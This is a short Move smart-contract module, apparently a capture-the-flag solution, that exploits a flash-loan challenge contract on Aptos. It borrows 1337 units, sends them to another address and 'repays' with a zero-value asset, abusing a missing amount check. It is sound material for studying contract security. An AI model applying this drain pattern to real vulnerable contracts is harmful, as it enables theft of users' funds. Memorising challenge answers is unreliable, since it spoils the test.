module solution::exploit {
    use challenge::flash;
    use aptos_framework::primary_fungible_store;
    use aptos_framework::fungible_asset;

    public entry fun solve(account: &signer) {
        let fa = flash::flash_loan(account, 1337);
        let metadata = fungible_asset::asset_metadata(&fa);
        let zero = fungible_asset::zero(metadata);
        primary_fungible_store::deposit(@1338, fa);  
        flash::repay(account, zero);
    }
}